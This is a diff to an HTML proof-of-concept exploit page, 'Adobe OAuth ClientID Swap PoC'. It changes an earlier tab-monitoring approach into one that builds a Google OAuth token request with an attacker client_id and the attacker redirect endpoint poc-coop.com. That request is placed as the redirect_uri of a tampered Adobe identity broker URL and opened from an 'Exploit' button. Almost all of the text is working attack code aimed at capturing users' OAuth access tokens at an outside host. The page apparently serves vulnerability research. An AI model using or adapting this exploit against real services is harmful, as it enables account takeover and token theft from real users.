@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Adobe OAuth New Tab PoC</title>
+  <title>Adobe OAuth ClientID Swap PoC</title>
   <style>
     body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
     button { padding:10px 20px; margin-top:20px; background:#4caf50; color:white; border:none; cursor:pointer; }
@@ -10,7 +10,7 @@
   </style>
 </head>
 <body>
-  <h2>Adobe OAuth New Tab PoC</h2>
+  <h2>Adobe OAuth ClientID Swap PoC</h2>
   <button onclick="launch()">Exploit</button>
   <div id="log"></div>
 
@@ -20,46 +20,32 @@ function log(msg){
   let box=document.getElementById("log"); box.scrollTop=box.scrollHeight;
 }
 
-let tab;
-let attackOAuth = "https://accounts.google.com/o/oauth2/v2/auth?" +
-  "client_id=50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com" +
-  "&redirect_uri=" + encodeURIComponent("https://poc-coop.com/store.html") +
-  "&response_type=token" +
-  "&scope=" + encodeURIComponent("openid profile email");
+// Build attacker's Google OAuth request
+function buildAttackGoogleOAuth(){
+  let attackerClient = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com"; // attacker client_id
+  let attackerRedirect = "https://poc-coop.com/store.html"; // attacker endpoint
+  let scope = "openid profile email";
 
-function launch(){
-  let urlParam = new URLSearchParams(window.location.search).get("url");
-  if (!urlParam) {
-    log("❌ Missing ?url= parameter, e.g. ?url=https://photoshop.adobe.com/");
-    return;
-  }
-  log("▶ Opening in new tab: " + urlParam);
-  tab = window.open(urlParam, "_blank");   // "_blank" forces new tab
-
-  setTimeout(monitor, 2000);
+  return "https://accounts.google.com/o/oauth2/v2/auth?" +
+    "client_id=" + encodeURIComponent(attackerClient) +
+    "&redirect_uri=" + encodeURIComponent(attackerRedirect) +
+    "&response_type=token" +
+    "&scope=" + encodeURIComponent(scope);
 }
 
-function monitor(){
-  if (!tab || tab.closed) {
-    log("❌ Tab closed, stopping monitor.");
-    return;
-  }
+function launch(){
+  let attackOAuth = buildAttackGoogleOAuth();
 
-  try {
-    let loc = tab.location.href;
-    log("Monitoring: " + loc);
+  // Craft tampered Adobe broker URL
+  let tamperedAdobeURL =
+    "https://auth-light.identity.adobe.com/?" +
+    "client_id=clio-playground-web" +
+    "&response_type=token" +
+    "&redirect_uri=" + encodeURIComponent(attackOAuth) +
+    "&environment=prod&locale=en_US&popup=true";
 
-    if (loc.includes("accounts.google.com")) {
-      log("⚠ Google OAuth detected → swapping client_id");
-      tab.location.replace(attackOAuth);
-      return;
-    }
-  } catch(e) {
-    // Expected when it’s cross-origin (Adobe/Google)
-    log("Cross-origin, waiting...");
-  }
-
-  setTimeout(monitor, 1000);
+  log("▶ Opening tampered Adobe URL...");
+  window.open(tamperedAdobeURL, "_blank"); // open in new tab
 }
 </script>
 </body>
